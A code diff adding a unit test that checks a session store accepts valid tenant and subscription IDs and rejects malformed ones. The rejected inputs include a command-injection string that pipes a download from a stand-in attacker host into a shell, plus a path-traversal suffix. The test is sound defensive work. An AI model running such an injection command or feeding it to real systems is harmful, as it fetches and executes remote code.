@@ -53,6 +53,23 @@ describe('session store', () => {
     expect(sessionStore.getState().tokens.arm).toBe(token)
   })
 
+  it('stores only valid tenant and subscription IDs', () => {
+    const s = sessionStore.getState()
+    expect(s.setTenantId(` ${TEST_TENANT} `)).toBe(true)
+    expect(s.setSubscriptionId(TEST_SUB)).toBe(true)
+    expect(sessionStore.getState()).toMatchObject({
+      tenantId: TEST_TENANT,
+      subscriptionId: TEST_SUB,
+    })
+
+    expect(s.setTenantId('contoso.onmicrosoft.com')).toBe(true)
+    expect(sessionStore.getState().tenantId).toBe('contoso.onmicrosoft.com')
+
+    expect(s.setTenantId('x; curl https://evil.example.net | sh')).toBe(false)
+    expect(s.setSubscriptionId(`${TEST_SUB}/../..`)).toBe(false)
+    expect(sessionStore.getState()).toMatchObject({ tenantId: '', subscriptionId: '' })
+  })
+
   it('sets each API token without touching the other', () => {
     const arm = armToken()
     const graph = graphToken()
